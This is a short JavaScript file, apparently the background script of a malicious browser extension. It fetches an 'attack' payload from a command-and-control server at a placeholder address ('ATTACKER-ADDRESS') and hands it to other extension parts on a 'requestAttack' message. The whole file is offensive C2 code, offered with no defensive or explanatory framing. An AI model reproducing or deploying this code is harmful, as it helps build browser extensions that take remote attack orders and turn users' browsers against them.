function getAttack(resolve, reject) {
    const xhttp = new XMLHttpRequest();
    xhttp.open("GET", c2, true);
    xhttp.addEventListener("load", () => {
        if (xhttp.status === 200) {
            resolve(JSON.parse(xhttp.responseText));
        } else {
            reject("failed");
        }
    });
    xhttp.send();
}

// ---------------------- main ----------------------

const c2 = "ATTACKER-ADDRESS";
const startConnection = new Promise(getAttack);

startConnection.then((response) => {
    browser.runtime.onMessage.addListener((request, sender, sendResponse) => {
        if (request["request"] === 'requestAttack') {
            sendResponse(response);
        }
    });
}).catch((failed) => {
    console.log(String(failed));
});
